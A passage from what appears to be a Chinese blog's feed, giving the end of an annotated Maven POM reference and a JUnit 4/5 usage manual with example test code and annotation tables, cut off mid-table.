class="comment">&lt;!--报表插件在仓库里的artifact ID --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--被使用的报表插件的版本（或版本范围） --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--任何配置是否被传播到子项目 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--报表插件的配置 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--一组报表的多重规范，每个规范可能有不同的配置。一个规范（报表集）对应一个执行目标 。例如，有1，2，3，4，5，6，7，8，9个报表。1，2，5构成A报表集，对应一个执行目标。2，5，8构成B报表集，对应另一个执行目标 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">reportSets</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--表示报表的一个集合，以及产生该集合的配置 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">reportSet</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--报表集合的唯一标识符，POM继承时用到 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--产生报表集合时，被使用的报表的配置 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--配置是否被继承到子POMs --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--这个集合里使用到哪些报表 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">reports</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">reportSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">reportSets</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">reporting</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 继承自该项目的所有子项目的默认依赖信息。这部分的依赖信息不会被立即解析,而是当子项目声明一个依赖（必须描述group ID和 artifact </span></span><br><span class="line"><span class="comment">        ID信息），如果group ID和artifact ID以外的一些信息没有描述，则通过group ID和artifact ID 匹配到这里的依赖，并使用这里的依赖信息。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                ......</span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目分发信息，在执行mvn deploy后表示要发布的位置。有了这些信息就可以把网站部署到远程服务器或者把构件部署到远程仓库。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--部署项目产生的构件到远程仓库需要的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--是分配给快照一个唯一的版本号（由时间戳和构建流水号）？还是每次都使用相同的版本号？参见repositories/repository元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">uniqueVersion</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-maven2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon maven2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>file://$&#123;basedir&#125;/target/deploy<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构件的快照部署到哪里？如果没有配置该元素，默认部署到repository元素配置的仓库，参见distributionManagement/repository元素 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">uniqueVersion</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-maven2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Banseon-maven2 Snapshot Repository<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>scp://svn.baidu.com/banseon:/usr/local/maven-snapshot<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--部署项目的网站需要的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">site</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--部署位置的唯一标识符，用来匹配站点和settings.xml文件里的配置 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-site<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--部署位置的名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>business api website<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--部署位置的URL，按protocol://hostname/path形式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">                scp://svn.baidu.com/banseon:/var/www/localhost/banseon-web</span><br><span class="line">            <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">site</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--项目下载页面的URL。如果没有该元素，用户应该参考主页。使用该元素的原因是：帮助定位那些不在仓库里的构件（由于license限制）。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">downloadUrl</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--如果构件有了新的group ID和artifact ID（构件移到了新的位置），这里列出构件的重定位信息。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构件新的group ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构件新的artifact ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构件新的版本号 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--显示给用户的，关于移动的额外信息，例如原因。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 给出该构件在远程仓库的状态。不得在本地项目中设置该元素，因为这是工具自动更新的。有效的值有：none（默认），converted（仓库管理员从 </span></span><br><span class="line"><span class="comment">            Maven 1 POM转换过来），partner（直接从伙伴Maven 2仓库同步过来），deployed（从Maven 2实例部 署），verified（被核实时正确的和最终的）。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">status</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--以值替代名称，Properties可以在整个POM中使用，也可以作为触发条件（见settings.xml配置文件里activation元素的说明）。格式是&lt;name&gt;value&lt;/name&gt;。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;脱离IDE，本地（Maven、Gradle、JDK、Ant）/在线（Travis-CI）build Java项目的步骤。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>JUnit使用手册</title>
    <link href="https://www.fvolcano.red/2021/manual-of-JUnit/"/>
    <id>https://www.fvolcano.red/2021/manual-of-JUnit/</id>
    <published>2021-05-11T11:20:35.000Z</published>
    <updated>2021-05-11T11:20:35.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/manual-of-JUnit/image-20210517194801837.png" alt="image-20210517194801837"><a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.guru99.com/junit-tutorial.html">JUnit Tutorial for Beginners: Learn in 3 Days</a></li><li><a href="https://github.com/junit-team/junit4">junit4 github</a></li><li><a href="https://www.vogella.com/tutorials/JUnit/article.html">Unit Testing with JUnit 5 - Tutorial</a></li><li><a href="https://junit.org/junit5/docs/current/user-guide/#overview">JUnit 5 User Guide</a></li></ol><h1 id="JUnit4"><a href="#JUnit4" class="headerlink" title="JUnit4"></a>JUnit4</h1><p>package: org.Junit</p><h2 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h2><h3 id="Test-Case"><a href="#Test-Case" class="headerlink" title="Test Case"></a><a href="https://www.guru99.com/test-case.html">Test Case</a></h3><p>A test case is a set of actions executed to verify a particular feature or functionality of your software application. A Test Case contains test steps, test data, precondition, postcondition developed for specific test scenario to verify any requirement. </p><p>For a <a href="https://www.guru99.com/test-scenario.html">Test Scenario</a>: Check Login Functionality there many possible test cases are:</p><ul><li>Test Case 1: Check results on entering valid User Id &amp; Password</li><li>Test Case 2: Check results on entering Invalid User ID &amp; Password</li><li>Test Case 3: Check response when a User ID is Empty &amp; Login Button is pressed, and many more</li></ul><h3 id="Test-fixture"><a href="#Test-fixture" class="headerlink" title="Test fixture"></a>Test fixture</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OutputFileTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> File output; </span><br><span class="line">    <span class="meta">@Before</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createOutputFile</span><span class="params">()</span> </span>&#123; </span><br><span class="line">       output = <span class="keyword">new</span> File(...);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">true<span class="meta">@After</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteOutputFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        output.delete(); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFile1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">// code for test case objective</span></span><br><span class="line">    &#125; </span><br><span class="line">true<span class="meta">@Test</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFile2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">// code for test case objective</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A test fixture is a context where a <strong>Test Case</strong> runs. Typically, test fixtures include:</p><ul><li>Objects or resources that are available for any test case.</li><li>Activities required that makes these objects/resources available, such as <strong>setup</strong> and <strong>teardown</strong>.</li></ul><h3 id="Test-Suites"><a href="#Test-Suites" class="headerlink" title="Test Suites"></a>Test Suites</h3><p>Test suite allows us to aggregate all test cases from multiple classes in an order in one place and run it together.</p><p>To run the suite test, you need to annotate a class using below-mentioned annotations:</p><p>@Runwith(Suite.class)</p><p>@SuiteClasses(test1.class,test2.class……) or @Suite.SuiteClasses ({test1.class, test2.class……})</p><p>例子：</p><p><img src="/2021/manual-of-JUnit/052416_0732_CreateJUnit3.png" alt="Create JUnit Test Suite"></p><p><img src="/2021/manual-of-JUnit/052416_0732_CreateJUnit4.png" alt="Create JUnit Test Suite"></p><h3 id="Test-Runner"><a href="#Test-Runner" class="headerlink" title="Test Runner"></a>Test Runner</h3><p>a tool for execution of the test cases.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;                </span><br><span class="line">true<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;        </span><br><span class="line">truetrueResult result = JUnitCore.runClasses(CreateAndSetName.class);</span><br><span class="line">        <span class="keyword">for</span> (Failure failure : result.getFailures()) &#123;</span><br><span class="line">            System.out.println(failure.toString());                    </span><br><span class="line">         &#125;        </span><br><span class="line">          System.out.println(result.wasSuccessful());                    </span><br><span class="line">       &#125;        </span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure><h3 id="Test-Scenario"><a href="#Test-Scenario" class="headerlink" title="Test Scenario"></a>Test Scenario</h3><p>A test scenario is defined as any functionality that can be tested. It is also called <em>Test Condition</em> or <em>Test Possibility</em>. </p><h3 id="Error-Collector"><a href="#Error-Collector" class="headerlink" title="Error Collector"></a>Error Collector</h3><p>With JUnit error collector, you can still continue with the test execution even after an issue is found or test fails. Error collector collects all error objects and reports it only once after the test execution is over.</p><h2 id="Annotations"><a href="#Annotations" class="headerlink" title="Annotations"></a>Annotations</h2><h3 id="Before-and-After"><a href="#Before-and-After" class="headerlink" title="@Before and @After"></a>@Before and @After</h3><p><strong>@Before</strong> annotation is used on a method containing code to run before each test case. i.e it runs before each test execution. <strong>@After</strong> annotation is used on a method containing java code to run after each test case. These methods will run even if any exceptions are thrown in the test case or in the case of assertion failures.</p><ul><li>All the methods annotated with <strong>@Before</strong> will run before each test case, but they may run in any order. </li><li>You can inherit @Before and @After methods from a super class, Execution is as follows: It is a standard execution process in JUnit.</li></ul><ol><li>Execute the @Before methods in the superclass</li><li>Execute the @Before methods in this class</li><li>Execute a @Test method in this class</li><li>Execute the @After methods in this class</li><li>Execute the @After methods in the superclass</li></ol><h3 id="BeforeClass-and-AfterClass"><a href="#BeforeClass-and-AfterClass" class="headerlink" title="@BeforeClass and @AfterClass"></a>@BeforeClass and @AfterClass</h3><p>Run a method only once for the entire test class before(after) any of the tests are executed. They are used for “<strong>once-only setup</strong>“ and “<strong>once-only teardown</strong>“, such as start &amp; stop servers and open &amp; close communication.</p><table><thead><tr><th align="left"><strong>Annotations</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">@Test</td><td align="left">This annotation is a replacement of org.junit.TestCase which indicates that public void method to which it is attached can be executed as a test Case.</td></tr><tr><td align="left">@Ignore</td><td align="left">This annotation can be used if you want to ignore some statements during test execution for e.g. disabling some test cases during test execution.</td></tr><tr><td align="left">@Test(timeout=500)</td><td align="left">This annotation can be used if you want to set some timeout during test execution for e.g. if you are working under some SLA (Service level agreement), and tests need to be completed within some specified time.</td></tr><tr><td align="left">@Test(expected=IllegalArgumentException.class)</td><td align="left">This annotation can be used if you want to handle some exception during test execution. For, e.g., if you want to check whether a particular method is throwing specified exception or not.</td></tr></tbody></table><h3 id="Ignore"><a href="#Ignore" class="headerlink" title="@Ignore"></a>@Ignore</h3><p>can be used in two scenarios as given below:</p><ol><li>If you want to ignore a test method, use @Ignore along with @Test annotation.</li><li>If you want to ignore all the tests of class, use @Ignore annotation at the class level.</li></ol><p>For exception testing, you can use</p><ul><li><strong>Optional parameter (expected) of @test</strong> annotation and</li><li>To trace the information ,”fail()” can be used</li></ul><h3 id="Rule"><a href="#Rule" class="headerlink" title="@Rule"></a>@Rule</h3><p>is used to create an object of error collector. Once the object for error collector is created, you can easily add all the errors into the object using method <strong>addError (Throwable error)</strong>, these errors will be logged in JUnit test result.</p><p>example:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> guru99.junit;        </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Assert;        </span><br><span class="line"><span class="keyword">import</span> org.junit.Rule;        </span><br><span class="line"><span class="keyword">import</span> org.junit.Test;        </span><br><span class="line"><span class="keyword">import</span> org.junit.rules.ErrorCollector;        </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorCollectorExample</span> </span>&#123;                </span><br><span class="line">    <span class="meta">@Rule</span>        </span><br><span class="line">    <span class="keyword">public</span> ErrorCollector collector = <span class="keyword">new</span> ErrorCollector();                        </span><br><span class="line">    <span class="meta">@Test</span>        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">example</span><span class="params">()</span> </span>&#123;                    </span><br><span class="line">    collector.addError(<span class="keyword">new</span> Throwable(<span class="string">&quot;There is an error in first line&quot;</span>));        </span><br><span class="line">    collector.addError(<span class="keyword">new</span> Throwable(<span class="string">&quot;There is an error in second line&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span>);                    </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            Assert.assertTrue(<span class="string">&quot;A &quot;</span> == <span class="string">&quot;B&quot;</span>);                    </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;                    </span><br><span class="line">            collector.addError(t);                    </span><br><span class="line">        &#125;        </span><br><span class="line">        System.out.println(<span class="string">&quot;World!!!!&quot;</span>);                    </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/manual-of-JUnit/052416_1156_JUnitErrorC1.png" alt="JUnit ErrorCollector"></p><h3 id="Parameters"><a href="#Parameters" class="headerlink" title="@Parameters"></a>@Parameters</h3><p>Parameterized test is to execute the same test over and over again using different values. It helps developer to save time in executing same test which differs only in their inputs and expected results. Using Parameterized test, one can set up a test method that retrieves data from some data source.</p><p>example:</p><ol><li>Create a parameterized test class</li></ol><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame3.png" alt="JUnit Parameterized Test"></p><p><strong>@RunWith</strong> annotation is used to specify its runner class name. If we don’t specify any type as a parameter, the runtime will choose <strong>BlockJunit4ClassRunner</strong> by default.</p><ol start="2"><li><p>Create a constructor that stores the test data. It stores 3 variables</p><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame4.png" alt="JUnit Parameterized Test"></p></li><li><p>Create a static method that generates and returns test data.</p></li></ol><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame5.png" alt="JUnit Parameterized Test"></p><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame6.png" alt="JUnit Parameterized Test"></p><ol start="4"><li>Create a test runner class to run parameterized test</li></ol><p><img src="/2021/manual-of-JUnit/052416_1228_JUnitParame7.png" alt="JUnit Parameterized Test"></p><h2 id="Assertions"><a href="#Assertions" class="headerlink" title="Assertions"></a>Assertions</h2><ul><li>org.junit.Assert</li></ul><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">void assertEquals(boolean expected, boolean actual)</td><td align="left">It checks whether two values are equals similar to equals method of Object class</td></tr><tr><td align="left">void assertFalse(boolean condition)</td><td align="left">functionality is to check that a condition is false.</td></tr><tr><td align="left">void assertNotNull(Object object)</td><td align="left">“assertNotNull” functionality is to check that an object is not null.</td></tr><tr><td align="left">void assertNull(Object object)</td><td align="left">“assertNull” functionality is to check that an object is null.</td></tr><tr><td align="left">void assertTrue(boolean condition)</td><td align="left">“assertTrue” functionality is to check that a condition is true.</td></tr><tr><td align="left">void fail()</td><td align="left">If you want to throw any assertion error, you have fail() that always results in a fail verdict.</td></tr><tr><td align="left">void assertSame([String message]</td><td align="left">“assertSame” functionality is to check that the two objects refer to the same object.</td></tr><tr><td align="left">void assertNotSame([String message]</td><td align="left">“assertNotSame” functionality is to check that the two objects do not refer to the same object.</td></tr></tbody></table><ul><li><strong>assertArrayEquals(expected, actual)</strong>: if arrays have the same length</li><li><strong>assertEquals( aDoubleValue, anotherDoubleValue, 0.001 )</strong>: Math.abs( expected – actual ) &lt;= delta</li></ul><h2 id="Class-and-Methods"><a href="#Class-and-Methods" class="headerlink" title="Class and Methods"></a>Class and Methods</h2><h3 id="org-junit-TestCase"><a href="#org-junit-TestCase" class="headerlink" title="org.junit.TestCase"></a>org.junit.TestCase</h3><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">int countTestCases()</td><td align="left">This method is used to count how many number of test cases executed by <strong>run(TestResult tr)</strong> method.</td></tr><tr><td align="left">TestResult createResult()</td><td align="left">This method is used to create a <strong>TestResult</strong> object.</td></tr><tr><td align="left">String getName()</td><td align="left">This method returns a string which is nothing but a <strong>TestCase</strong>.</td></tr><tr><td align="left">TestResult run()</td><td align="left">This method is used to execute a test which returns a <strong>TestResult</strong> object</td></tr><tr><td align="left">void run(TestResult result)</td><td align="left">This method is used to execute a test having a <strong>TestResult</strong> object which doesn’t returns anything.</td></tr><tr><td align="left">void setName(String name)</td><td align="left">This method is used to set a name of a <strong>TestCase.</strong></td></tr><tr><td align="left">void setUp()</td><td align="left">This method is used to write resource association code. e.g. Create a database connection.</td></tr><tr><td align="left">void tearDown()</td><td align="left">This method is used to write resource release code. e.g. Release database connection after performing transaction operation.</td></tr></tbody></table><h3 id="org-junit-TestResult"><a href="#org-junit-TestResult" class="headerlink" title="org.junit.TestResult"></a>org.junit.TestResult</h3><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">void addError(Test test, Throwable t)</td><td align="left">This method is used if you require add an error to the test.</td></tr><tr><td align="left">void addFailure(Test test, AssertionFailedError t)</td><td align="left">This method is used if you require add a failure to the list of failures.</td></tr><tr><td align="left">void endTest(Test test)</td><td align="left">This method is used to notify that a test is performed(completed)</td></tr><tr><td align="left">int errorCount()</td><td align="left">This method is used to get the error detected during test execution.</td></tr><tr><td align="left">Enumeration&lt;TestFailure&gt; errors()</td><td align="left">This method simply returns a collection (Enumeration here) of errors.</td></tr><tr><td align="left">int failureCount()</td><td align="left">This method is used to get the count of errors detected during test execution.</td></tr><tr><td align="left">void run(TestCase test)</td><td align="left">This method is used to execute a test case.</td></tr><tr><td align="left">int runCount()</td><td align="left">This method simply counts the executed test.</td></tr><tr><td align="left">void startTest(Test test)</td><td align="left">This method is used to notify that a test is started.</td></tr><tr><td align="left">void stop()</td><td align="left">This method is used to test run to be stopped.</td></tr></tbody></table><h3 id="org-junit-TestSuite"><a href="#org-junit-TestSuite" class="headerlink" title="org.junit.TestSuite"></a>org.junit.TestSuite</h3><table><thead><tr><th align="left"><strong>Method</strong></th><th align="left"><strong>Description</strong></th></tr></thead><tbody><tr><td align="left">void addTest(Test test)</td><td align="left">This method is used if you want to add a test to the suite.</td></tr><tr><td align="left">void addTestSuite(Class&lt;? extends TestCase&gt; testClass)</td><td align="left">This method is used if you want to specify the class while adding a test to the suite.</td></tr><tr><td align="left">int countTestCases()</td><td align="left">This method is used if you want to count the number of test cases.</td></tr><tr><td align="left">String getName()</td><td align="left">This method is used to get the name of the test suite.</td></tr><tr><td align="left">void run(TestResult result)</td><td align="left">This method is used to execute a test and collect test result in <strong>TestResult</strong> object.</td></tr><tr><td align="left">void setName(String name)</td><td align="left">This method is used to set the name of <strong>TestSuite</strong>.</td></tr><tr><td align="left">Test testAt(int index)</td><td align="left">This method is used if you want to return the test at given index.</td></tr><tr><td align="left">int testCount()</td><td align="left">This method is used if you want to return a number of tests in the Suite.</td></tr><tr><td align="left">static Test warning(String message)</td><td align="left">This method returns a test which will fail and log a warning message.</td></tr></tbody></table><h1 id="JUnit-5"><a href="#JUnit-5" class="headerlink" title="JUnit 5"></a>JUnit 5</h1><blockquote><p>JUnit 5 = JUnit Platform + JUnit Jupiter + JUnit Vintage</p></blockquote><h2 id="Annotations-1"><a href="#Annotations-1" class="headerlink" title="Annotations"></a>Annotations</h2><p>Unless otherwise stated, all core annotations are located in the <code>org.junit.jupiter.api</code> package in the <code>junit-jupiter-api</code> module.</p><table><thead><tr><th align="left">Annotation</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left"><code>@Test</code></td><td align="left">Denotes that a method is a test method. Unlike JUnit 4’s <code>@Test</code> annotation, this annotation does not declare any attributes, since test extensions in JUnit Jupiter operate based on their own dedicated annotations. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@ParameterizedTest</code></td><td align="left">Denotes that a method is a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests">parameterized test</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@RepeatedTest</code></td><td align="left">Denotes that a method is a test template for a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-repeated-tests">repeated test</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@TestFactory</code></td><td align="left">Denotes that a method is a test factory for <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-dynamic-tests">dynamic tests</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@TestTemplate</code></td><td align="left">Denotes that a method is a <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-templates">template for test cases</a> designed to be invoked multiple times depending on the number of invocation contexts returned by the registered <a href="https://junit.org/junit5/docs/current/user-guide/#extensions-test-templates">providers</a>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@TestMethodOrder</code></td><td align="left">Used to configure the <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-execution-order">test method execution order</a> for the annotated test class; similar to JUnit 4’s <code>@FixMethodOrder</code>. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@TestInstance</code></td><td align="left">Used to configure the <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-test-instance-lifecycle">test instance lifecycle</a> for the annotated test class. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@DisplayName</code></td><td align="left">Declares a custom <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-display-names">display name</a> for the test class or test method. Such annotations are not <em>inherited</em>.</td></tr><tr><td align="left"><code>@DisplayNameGeneration</code></td><td align="left">Declares a custom <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-display-name-generator">display name generator</a> for the test class. Such annotations are <em>inherited</em>.</td></tr><tr><td align="left"><code>@BeforeEach</code></td><td align="left">Denotes that the annotated method should be executed <em>before</em> <strong>each</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, or <code>@TestFactory</code> method in the current class; analogous to JUnit 4’s <code>@Before</code>. Such methods are <em>inherited</em> unless they are <em>overridden</em>.</td></tr><tr><td align="left"><code>@AfterEach</code></td><td align="left">Denotes that the annotated method should be executed <em>after</em> <strong>each</strong> <code>@Test</code>, <code>@RepeatedTest</code>, <code>@ParameterizedTest</code>, or <code>@TestFactory</code> method in the current class; analogous to JUnit 4’s <code>@After</code>. Such methods are 